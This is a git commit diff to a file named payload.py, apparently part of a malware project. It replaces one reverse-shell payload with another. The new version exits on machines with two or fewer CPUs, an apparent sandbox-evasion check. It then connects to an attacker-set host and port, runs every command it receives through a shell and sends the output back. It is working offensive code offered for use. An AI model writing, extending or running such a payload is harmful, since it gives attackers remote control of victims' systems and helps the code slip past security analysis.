6b523d40c4f214ae494607bc5f889a5d762a2a8c
Lionskey <LoganGoins@protonmail.com>
2023-04-01 22:51:57 -0500

    Revised payload. Laid the foundation for RSA encryption

--- src/payload.py
+++ src/payload.py
@@ -1,12 +1,36 @@
 # Simple payload for debugging. A more advanced payload is coming soon
 
 import os
-import pty
 import socket
+import subprocess
 
-s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("127.0.0.1", 1337))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-pty.spawn("/bin/bash")
+
+if os.cpu_count() <= 2:
+    quit()
+
+HOST = '127.0.0.1' # Change this host address to attacker machine address
+PORT = 1337
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+
+s.send(str.encode("Successfully entered reverse shell session.\n"))
+
+while 1:
+    try:
+        s.send(str.encode(os.getcwd() + " > "))
+        data = s.recv(1024).decode("UTF-8")
+        data = data.strip('\n')
+        if data == "quit": 
+            break
+        if data[:2] == "cd":
+            os.chdir(data[3:])
+        if len(data) > 0:
+            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
+            stdout_value = proc.stdout.read() + proc.stderr.read()
+            output_str = str(stdout_value, "UTF-8")
+            s.send(str.encode("\n" + output_str))
+    except Exception as e:
+        continue
+    
+s.close()
